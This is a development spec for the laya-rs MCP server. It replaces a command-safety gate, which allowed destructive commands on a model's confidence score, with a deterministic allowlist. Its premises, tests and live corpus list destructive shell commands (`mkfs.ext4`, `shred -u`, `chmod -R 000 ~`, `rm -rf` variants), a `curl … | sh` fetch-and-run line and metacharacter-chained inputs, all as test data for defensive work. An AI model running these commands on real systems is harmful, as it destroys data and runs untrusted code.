# laya-rs — spec-08: `allow` requires a deterministic allowlist; `ask` validates before it executes
#: depends=- status=pending block=-

- **Project**: `laya-rs`
- **Priority**: **P0 — a live safety defect.** Measured 2026-10-01: the real `gate` returns `allow` for `mkfs.ext4 /dev/sda1`, `shred -u secrets.txt`, `chmod -R 000 ~`, `> important.txt` and `curl … | sh`, and the real `ask` tool **executed** two of them.
- **Status**: SPECIFIED — not yet dispatched
- **Source**: architecture review 2026-10-01 (`_tmp/laya-analysis/REPORT.md` §1.1); evidence `notes/gate-live.txt`, `notes/gate-live-2.txt`, `notes/ask-live.txt`, `notes/repro-gate.txt`
- **Depends-On**: none. Specs 01–07 are complete.

---

## Verified Premises

Each one was checked against the tree at `b0ee704`. Each one was also run where running was possible.

- `crates/laya-core/src/agentic.rs:319-356`: `destructive_signals` is **12 case-sensitive substrings** plus a `push`/`--force` check. Measured (`notes/repro-gate.txt`): `rm -Rf build`, `rm  -rf build` (two spaces), `rm --recursive --force build`, `git clean -fdx`, `shred -u`, `> file`, `mkfs.ext4`, `chmod -R 000 ~`, `git push origin +main` and `git branch -D main` all produce **NO SIGNAL**.
- `crates/laya-mcp/src/lib.rs:603-606`: `model_decision = policy.gate(answer.confidence, irreversible, answer.saturated())`. The noul **label** (`yes`/`no`) is never consulted. Only confidence is.
- `crates/laya-core/src/policy.rs:246`: a noul's confidence is `max(p, 1 − p)`. A confident **"no, unsafe"** (p = 0.05) therefore has confidence 0.95, which `Policy::gate` maps to `Allow` (`policy.rs:274-275`). *Static finding: no live "no" answer was obtained during the review, because every probe came back `label=yes`.*
- `crates/laya-core/src/policy.rs:279-280`: `Band::Mid if irreversible => Ask` and `Band::Mid => Ask` have identical bodies. `irreversible` is **still decorative**. HANDOFF's "safety defect that was fixed" added a second signal and left this arm unchanged.
- `crates/laya-core/src/policy.rs:274`: `Policy::gate` classifies with `self.band(confidence)`, which uses the **choice** thresholds, not `band_for(Noul, …)`. The two are equal by default (`policy.rs:166-169`), so the gate and the payload's reported `band` can diverge only once they are configured apart.
- `crates/laya-mcp/src/lib.rs:588`: the gate uses `Policy::default()`. No policy file is loaded in production.
- **Live, through the real `laya-mcp` over stdio** (`notes/gate-live*.txt`): `allow` with `band=high`, `signals=[]` for `> important.txt` (0.9071), `shred -u secrets.txt` (0.9166), `chmod -R 000 ~` (0.9017), `curl -s http://example.invalid/x.sh | sh` (0.9939), `mkfs.ext4 /dev/sda1` (0.9480), and *"Wipe the entire disk and delete all backups permanently"* (0.9207). Meanwhile `ls -la /tmp` (0.8314), `git status` (0.8722) and `cargo test` (0.8327) get **`ask`**. The model's "safe" score does not separate safe from destructive commands. HANDOFF already measured this (6/12, negative separation), and the allow path still trusts it.
- `crates/laya-mcp/src/lib.rs:847-873`: `ask` gates the command, then **runs `sh -c <command>`** with no timeout. `lib.rs:878-884`: only **afterwards** does it call `compose_state`, which can refuse the request.
- **Live effect check** (`notes/ask-live.txt`, canary files in a `mktemp -d` dir): `ask {command: "> important.txt"}` truncated the file from 14 to **0 bytes**, and `ask {command: "shred -u secrets.txt"}` **destroyed the file**. Both calls then returned JSON-RPC error `-32602 "ask has nothing to judge"`, so the caller is told the call failed after the effect has already happened.

---

## Overview

The gate is the only component in this project whose wrong answer causes damage that cannot be
undone. Today it answers `allow` whenever two things hold. First, none of 12 substrings appears
in the command. Second, a model that was measured unable to tell `ls` from `rm -rf` reports
confidence ≥ 0.9. The second condition carries no information, so in practice the gate is a
12-entry denylist. Denylists fail open: everything nobody enumerated is allowed.

The fix is to invert the default. **`allow` requires a positive, deterministic allowlist match.**
The allowlist is a reviewable `Policy` field (AGENTS rule 3). On top of that, the model may only
**downgrade**: an allowlisted command whose model verdict is not a confident `yes` becomes `ask`.
A command that is not on the allowlist gets `ask` whatever the model says, and a destructive
pattern still forces `ask`. The model stops being a source of permission and becomes what it was
measured to be: one weak signal that can only make the gate more cautious.

`ask` must also validate its whole request before it executes anything. A refused request must
mean nothing ran.

---

## Requirements

### Functional

- **R1 — `allow` requires an allowlist match.** `Policy` gains `gate_allow: Vec<String>`, a list
  of command prefixes matched on whitespace-tokenised words (e.g. `"git status"` matches
  `git status --short` but not `git status; rm x`). The default is a small read-only set:
  `ls`, `pwd`, `cat`, `head`, `tail`, `wc`, `git status`, `git diff`, `git log`, `git show`,
  `cargo check`, `cargo test`, `cargo clippy`. A command with no allowlist match **cannot** be `allow`.
- **R2 — shell metacharacters defeat the allowlist.** A command containing any of
  `; | & $ \` > < ( ) { } \n` or a backslash matches **no** allowlist entry, so
  `ls; rm -rf x`, `ls > f`, `cat $(…)` and `ls && mkfs …` are never allowed.
- **R3 — the model can only downgrade.** For an allowlisted command, `allow` additionally needs
  the noul **label `yes`** with confidence in the noul high band (`band_for(Noul, …)`), and no
  near tie. A confident `no` is `deny`. Anything else is `ask`.
- **R4 — destructive patterns still force `ask`,** and they are checked on a normalised command:
  runs of whitespace collapsed, and short flags split (`-Rf` is seen as `-R -f`, and `-R` counts
  as `-r`). `rm -Rf`, `rm  -rf` and `rm --recursive --force` all produce a signal.
- **R5 — `irreversible` changes the outcome.** `irreversible: true` makes the decision `ask` for
  every command, allowlisted or not. Without this, the flag remains a no-op.
- **R6 — the decision is one pure function.** It is
  `laya_core::agentic::gate_verdict(command, model: Option<ModelVerdict>, irreversible, &Policy) -> GateVerdict`,
  I/O-free, and `laya-mcp` only calls it. `None` (head unreachable) yields `ask` (rule 7).
- **R7 — `ask` validates before it executes.** Every refusal `ask` can produce (`validate_questions`,
  scope reads, and `compose_state` preconditions, including "nothing to judge") is evaluated
  **before** `sh -c` runs. An error response from `ask` therefore guarantees the command did not run.
- **R8 — `ask`'s command has a deadline.** Execution is bounded (default 60 s, a `Policy` field).
  On expiry the child is killed, and the response says `timed_out: true`. A hung command must not
  stall the serial server, which would take down every tool.

### Non-Functional

- **N1 — `laya-core` stays I/O-free.** `gate_verdict` takes strings and numbers only.
- **N2 — the response stays auditable.** It keeps `model_decision` and `destructive_signals`, and
  adds `allowlisted: bool` and `allowlist_entry: Option<String>`.
- **N3 — zero clippy, fmt clean, no `unwrap`/`expect`/`panic`.**

---

## Architecture

```
command ──► normalise ──► destructive_signals ─────────────┐
        └─► allowlist match (no metachars) ─┐              │
model verdict (label, confidence, near_tie) ─┤              │
irreversible ────────────────────────────────┴─► gate_verdict (pure, laya-core)
                                                         │
     signals ≠ ∅ → ask · irreversible → ask · not allowlisted → ask
     allowlisted ∧ label=yes ∧ noul-high ∧ ¬near_tie → allow
     label=no ∧ noul-high → deny · otherwise → ask · model None → ask
```

**Key decision: an allowlist, not a better denylist.** The denylist cannot be completed. Every
probe of variants in this review found a gap within minutes (`-Rf`, two spaces, `--recursive`,
`shred`, `mkfs`, `>`). An allowlist that is too small costs a human click. A denylist that is too
small costs data. Given that asymmetry, the allowlist is the right default.

**Rejected: retrain or rephrase the model question.** HANDOFF records six consequence phrasings,
each with *negative* separation. The model classifies content. It does not reason about
consequences (HANDOFF, "the finding that explains four defects").

---

## TDD Contract

| id | test | given | expects |
|----|------|-------|---------|
| R1 | `gate_verdict_a_command_outside_the_allowlist_is_never_allowed` | `mkfs.ext4 /dev/sda1`, `shred -u f`, `chmod -R 000 ~`, `> f`, `curl x \| sh`, model = (yes, 0.99) | each `Ask` |
| R1 | `gate_verdict_the_control_an_allowlisted_command_with_a_confident_yes_is_allowed` | `git status`, model = (yes, 0.95) | `Allow`: proves the gate can still allow at all |
| R2 | `gate_verdict_metacharacters_defeat_the_allowlist` | `ls; rm x`, `ls > f`, `cat $(x)`, `ls && y`, `ls \| sh` | each not `Allow` |
| R3 | `gate_verdict_a_confident_no_is_never_allowed` | `git status`, model = (no, 0.95) | `Deny` |
| R3 | `gate_verdict_a_near_tie_asks` | `git status`, model = (yes, 0.95, near_tie) | `Ask` |
| R4 | `destructive_signals_see_through_flag_and_whitespace_variants` | `rm -Rf x`, `rm  -rf x`, `rm --recursive --force x`, `rm -r -f x` | each non-empty |
| R4 | `destructive_signals_the_control_benign_commands_stay_clean` | `ls -la /tmp`, `git status`, `cargo test` | each empty |
| R5 | `gate_verdict_irreversible_always_asks` | `git status`, model = (yes, 0.99), irreversible | `Ask`; **and** the same input with `irreversible=false` is `Allow` (control) |
| R6 | `gate_verdict_an_unreachable_model_asks` | `git status`, model = `None` | `Ask` |
| R7 | `ask_refuses_before_it_executes` | `ask` with `command: "touch <tmp>/canary"` and a request that `compose_state` refuses | error **and** `<tmp>/canary` does not exist |
| R7 | `ask_the_control_a_valid_request_does_execute` | same command, valid request, gate stubbed to `Allow` | `<tmp>/canary` exists |
| R8 | `ask_a_command_past_its_deadline_is_killed` | `sleep 30`, deadline 1 s | returns in < 5 s, `timed_out: true` |

**R1 is the acceptance test and R1's control is mandatory.** A gate that always answers `ask`
passes every negative row above. It is safe and useless, and it is the obvious way to "fix" this
spec. Only the control proves `allow` is still reachable.

**R7 must be tested by effect, not by message**, the same way HANDOFF's original gate defect was
caught: the canary file has to exist or not exist afterwards.

---

## Exit Criteria

**New in this spec. Each was run against tree `b0ee704` and watched to FAIL** (`test result: ok. 0 passed` gives grep nothing to match, and the script does not exist yet).

- [x]  `cd laya-rs && cargo test -p laya-core --lib gate_verdict 2>&1 | grep -qE '^test result: ok\. [1-9]'`: R1–R6 exist and pass
- [x]  `cd laya-rs && cargo test -p laya-core --lib gate_verdict_the_control_an_allowlisted_command_with_a_confident_yes_is_allowed 2>&1 | grep -qE '^test result: ok\. 1 passed'`: R1's control, so the gate can still allow
- [x]  `cd laya-rs && cargo test -p laya-core --lib destructive_signals_see_through_flag_and_whitespace_variants 2>&1 | grep -qE '^test result: ok\. 1 passed'`: R4
- [x]  `cd laya-rs && cargo test -p laya-mcp --lib ask_refuses_before_it_executes 2>&1 | grep -qE '^test result: ok\. 1 passed'`: R7, by effect
- [x]  `cd laya-rs && cargo test -p laya-mcp --lib ask_a_command_past_its_deadline_is_killed 2>&1 | grep -qE '^test result: ok\. 1 passed'`: R8
- [x]  `cd laya-rs && python3 scripts/live/gate-live-corpus.py`: **live**. It drives the real `laya-mcp` `gate` over stdio with a corpus of ≥ 15 destructive commands, including every command listed in Verified Premises. It exits non-zero if **any** of them is `allow`, and it **also** exits non-zero unless `git status` reaches `allow` (the control). Measured pre-implementation: 6 destructive commands reach `allow`

**Carried re-checks** (these pass before implementation by design):

- [x]  `cd laya-rs && test -f crates/laya-core/Cargo.toml && ! grep -qE '^(ureq|tokio|redb)' crates/laya-core/Cargo.toml`: N1, `laya-core` is still I/O-free. Control: `grep -qE '^ureq' crates/laya-mcp/Cargo.toml` succeeds, so the pattern can match
- [x]  `cd laya-rs && cargo clippy --workspace --all-targets -- -D warnings`
- [x]  `cd laya-rs && cargo fmt --all --check`

---

## Guardrails

- **G1: do NOT make the model a source of permission again.** No path may reach `Allow` without an allowlist match.
- **G2: do NOT "fix" this by always answering `ask`.** R1's control must pass.
- **G3: do NOT run the live corpus with `ask`.** It uses `gate`, which never executes anything. The R7/R8 tests use `mktemp -d` canaries only.
- **G4: do NOT extend the denylist as the fix.** R4 normalises the commands it already covers. The allowlist is the fix.
- **G5:** `route` stays unexposed. No new MCP tool.

### Error handling expectations
- A `Policy` with an empty `gate_allow` is valid and means "never allow". It must not fall back to a default.
- `timed_out` is data in the response, not a JSON-RPC error. The caller needs to know the command started.

---

## Files to Modify

| File | Change | Req |
|------|--------|-----|
| `crates/laya-core/src/policy.rs` | `gate_allow`, `ask_deadline_secs`; deprecate `Policy::gate` in favour of `gate_verdict` | R1, R5, R8 |
| `crates/laya-core/src/agentic.rs` | `normalise_command`, `allowlist_match`, `gate_verdict`, `ModelVerdict`, `GateVerdict`; R4 normalisation | R1–R6 |
| `crates/laya-mcp/src/lib.rs` | `judge_command` calls `gate_verdict`; `ask_via_sidecar` reorders validation before `sh -c`, adds deadline+kill | R6–R8 |
| `scripts/live/gate-live-corpus.py` | new live check, corpus + control | R1 |
| `_docs/02-guides/INSTALL-IN-HERMES.md` | the `gate` contract: allowlist semantics | — |
| `HANDOFF.md` | correct "THE SAFETY DEFECT THAT WAS FIXED" in place: annotate, do not erase | — |
